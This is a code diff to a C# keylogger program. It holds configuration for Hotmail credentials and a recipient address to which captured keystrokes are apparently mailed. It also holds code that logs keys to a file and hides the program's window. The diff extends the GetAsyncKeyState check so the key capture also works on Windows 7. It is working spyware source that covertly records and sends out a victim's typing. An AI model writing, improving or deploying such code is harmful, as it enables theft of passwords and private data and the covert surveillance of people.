@@ -28,7 +28,7 @@ namespace KeyLogger
 
         /////////////// HOTMAIL ACCOUNT CONFIG ///////////////
         public static string EmailFrom = "yourHOTMAIL@hotmail.com";
-        public static string EmailPassword = "yourHOTMAILpassword"; //it needs to be the password of the email account of EmailFrom
+        public static string EmailPassword = "yourHOTMAILpassword"; //it needs to be the password of EmailFrom
 
         public static string EmailTo = "theirHOTMAIL@hotmail.com";
         /////////////// HOTMAIL ACCOUNT CONFIG ///////////////
@@ -45,9 +45,7 @@ namespace KeyLogger
             Console.Write(text);
 
             using (StreamWriter sw = File.AppendText(FILE_PATH))
-            {
                 sw.Write(text);
-            }
 
             if (!Hidden) {
                 Hidden = true;
@@ -110,7 +108,8 @@ namespace KeyLogger
                 for (int i = 0; i < 127; i++)
                 {
                     int keyState = GetAsyncKeyState(i);
-                    if (keyState == 32769)
+                    if (keyState == 32769 || //windows 10
+                        keyState == -32767) //windows 7
                     {
                         switch (i)
                         {
